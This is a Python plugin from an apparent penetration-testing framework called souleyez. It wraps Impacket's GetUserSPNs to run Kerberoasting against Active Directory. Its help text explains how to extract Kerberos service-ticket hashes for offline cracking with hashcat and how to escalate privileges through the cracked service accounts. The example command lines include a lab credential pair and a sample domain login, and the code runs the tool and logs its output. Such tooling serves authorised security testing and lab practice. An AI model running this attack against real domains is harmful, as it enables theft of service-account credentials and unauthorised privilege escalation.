#!/usr/bin/env python3
"""
souleyez.plugins.impacket_getuserspns - Kerberoasting attack (GetUserSPNs)
"""

import subprocess
import time
from typing import List

from .impacket_common import find_impacket_command
from .plugin_base import PluginBase

HELP = {
    "name": "Impacket GetUserSPNs - Kerberoasting",
    "description": (
        "Need to extract Kerberos TGS hashes for offline cracking?\n\n"
        "GetUserSPNs performs Kerberoasting, extracting TGS tickets for service accounts "
        "that can be cracked offline with hashcat or john.\n\n"
        "Use GetUserSPNs after getting domain credentials to:\n"
        "- Find service accounts with SPNs (Service Principal Names)\n"
        "- Extract TGS tickets/hashes for offline cracking\n"
        "- Identify weak service account passwords\n"
        "- Escalate privileges via cracked service accounts\n\n"
        "Quick tips:\n"
        "- Requires valid domain credentials (from GPP, password spray, etc.)\n"
        "- Output format compatible with hashcat mode 13100\n"
        "- Use -request to actually request TGS tickets\n"
    ),
    "usage": 'souleyez jobs enqueue impacket-getuserspns <domain>/<user>:<pass>@<dc> --args "-request"',
    "examples": [
        'souleyez jobs enqueue impacket-getuserspns "active.htb/svc_tgs:GPPstillStandingStrong2k18@10.129.5.167" --args "-request"',
        'souleyez jobs enqueue impacket-getuserspns "corp.local/admin:Password1@dc01.corp.local" --args "-dc-ip 192.168.1.10 -request"',
    ],
    "flags": [
        ["-dc-ip <ip>", "IP address of the domain controller"],
        ["-request", "Request TGS tickets (required for cracking)"],
        ["-outputfile <file>", "Save TGS hashes to file"],
    ],
}


class ImpacketGetUserSPNsPlugin(PluginBase):
    name = "Impacket GetUserSPNs"
    tool = "impacket-getuserspns"
    category = "credential_access"
    HELP = HELP

    def build_command(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ):
        """Build command for background execution with PID tracking."""
        args = args or []

        # Replace <target> placeholder
        args = [arg.replace("<target>", target) for arg in args]

        # Find the correct command (varies by install: apt vs pipx)
        getuserspns_cmd = find_impacket_command("GetUserSPNs")
        if not getuserspns_cmd:
            return None  # Tool not installed

        # Build command - GetUserSPNs expects: domain/user:pass@host [options]
        cmd = [getuserspns_cmd]

        # If first arg looks like credentials (contains / and @), use it as positional
        if args and "/" in args[0]:
            cmd.append(args[0])
            args = args[1:]
        else:
            cmd.append(target)

        cmd.extend(args)

        return {"cmd": cmd, "timeout": 1800}

    def run(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ) -> int:
        """Execute impacket-GetUserSPNs and write output to log_path."""

        args = args or []

        # Replace <target> placeholder
        args = [arg.replace("<target>", target) for arg in args]

        # Find the correct command (varies by install: apt vs pipx)
        getuserspns_cmd = find_impacket_command("GetUserSPNs")
        if not getuserspns_cmd:
            if log_path:
                with open(log_path, "w", encoding="utf-8") as fh:
                    fh.write("ERROR: GetUserSPNs not found. Install with:\n")
                    fh.write("  Kali: sudo apt install python3-impacket\n")
                    fh.write("  Ubuntu: pipx install impacket\n")
            return 1

        # Build command
        cmd = [getuserspns_cmd]

        # If first arg looks like credentials, use it as positional
        if args and "/" in args[0]:
            cmd.append(args[0])
            args = args[1:]
        else:
            cmd.append(target)

        cmd.extend(args)

        if not log_path:
            try:
                proc = subprocess.run(
                    cmd, capture_output=True, timeout=300, check=False
                )
                return proc.returncode
            except Exception:
                return 1

        try:
            # Create metadata header
            with open(log_path, "w", encoding="utf-8", errors="replace") as fh:
                fh.write(f"=== Plugin: Impacket GetUserSPNs ===\n")
                fh.write(f"Target: {target}\n")
                fh.write(f"Args: {args}\n")
                fh.write(f"Label: {label}\n")
                fh.write(
                    f"Started: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n"
                )
                fh.write(f"Command: {' '.join(cmd)}\n\n")

            # Run GetUserSPNs
            proc = subprocess.run(
                cmd, capture_output=True, timeout=300, check=False, text=True
            )

            # Write output
            with open(log_path, "a", encoding="utf-8", errors="replace") as fh:
                if proc.stdout:
                    fh.write(proc.stdout)
                if proc.stderr:
                    fh.write(proc.stderr)
                fh.write(
                    f"\n=== Completed: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())} ===\n"
                )
                fh.write(f"Exit Code: {proc.returncode}\n")

            return proc.returncode

        except subprocess.TimeoutExpired:
            with open(log_path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write("\n\nERROR: GetUserSPNs timed out after 300 seconds\n")
            return 124

        except Exception as e:
            with open(log_path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write(f"\n\nERROR: {str(e)}\n")
            return 1


plugin = ImpacketGetUserSPNsPlugin()
